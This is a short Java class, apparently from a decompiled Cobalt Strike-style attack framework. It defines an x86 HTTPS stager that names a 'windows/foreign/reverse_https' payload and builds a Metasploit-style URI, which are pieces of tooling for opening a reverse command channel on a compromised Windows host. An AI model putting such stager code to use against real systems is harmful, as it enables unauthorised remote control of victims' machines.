package stagers;

import common.CommonUtils;
import common.ScListener;

public class ForeignHTTPSStagerX86 extends GenericHTTPSStagerX86 {
   public ForeignHTTPSStagerX86(ScListener var1) {
      super(var1);
   }

   public String payload() {
      return "windows/foreign/reverse_https";
   }

   public String getURI() {
      return CommonUtils.MSFURI(32);
   }
}
